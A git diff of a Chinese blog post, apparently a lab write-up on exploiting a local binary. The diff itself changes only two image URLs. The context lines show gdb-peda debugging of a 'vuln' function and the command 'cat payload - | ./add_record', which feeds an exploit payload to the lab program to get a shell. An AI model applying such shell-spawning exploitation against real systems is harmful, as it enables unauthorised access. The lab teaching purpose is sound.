 结果耐人寻味：产生了两个新的进程，4312执行了程序/bin/dash ，4313执行了程序/bin/bash
 
@@ -777,7 +783,7 @@ gdb-peda$ break vuln
 gdb-peda$ r < payload
 ```
 
-![image-20211124181204165](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124181204165.png)
+![image-20211124181204165](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124181204165.png)
 
 ```
 gdb-peda$ s       #进行单步执行         
@@ -789,5 +795,5 @@ gdb-peda$ s       #进行单步执行
 cat payload - | ./add_record
 ```
 
-![image-20211124192251868](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124192251868.png)
+![image-20211124192251868](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124192251868.png)
 
